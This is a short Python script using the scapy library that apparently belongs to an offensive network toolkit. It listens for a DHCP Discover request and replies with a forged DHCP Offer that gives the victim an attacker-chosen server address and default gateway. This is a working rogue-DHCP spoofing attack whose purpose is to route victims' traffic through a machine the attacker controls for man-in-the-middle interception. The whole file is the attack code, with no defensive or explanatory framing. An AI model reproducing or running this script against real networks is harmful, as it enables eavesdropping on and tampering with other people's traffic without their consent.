from scapy.all import *

def run(spoofed_ip, spoofed_gw):
    def dhcp_offer(pkt):
        if DHCP in pkt and pkt[DHCP].options[0][1] == 1:
            mac = pkt[Ether].src
            ether = Ether(src=get_if_hwaddr(conf.iface), dst=mac)
            ip = IP(src=spoofed_ip, dst="255.255.255.255")
            udp = UDP(sport=67, dport=68)
            bootp = BOOTP(op=2, yiaddr=spoofed_ip, siaddr=spoofed_ip,
                          chaddr=pkt[BOOTP].chaddr, xid=pkt[BOOTP].xid)
            dhcp = DHCP(options=[
                ("message-type", "offer"),
                ("server_id", spoofed_ip),
                ("router", spoofed_gw),
                ("lease_time", 43200),
                ("subnet_mask", "255.255.255.0"),
                "end"
            ])
            offer_pkt = ether / ip / udp / bootp / dhcp
            sendp(offer_pkt, verbose=0)
    
    try:
        sniff(filter="udp and (port 67 or 68)", prn=dhcp_offer, store=0, count=1)
        return "[+] Spoofed DHCP Offer sent"
    except Exception as e:
        return f"[!] Error: {str(e)}"

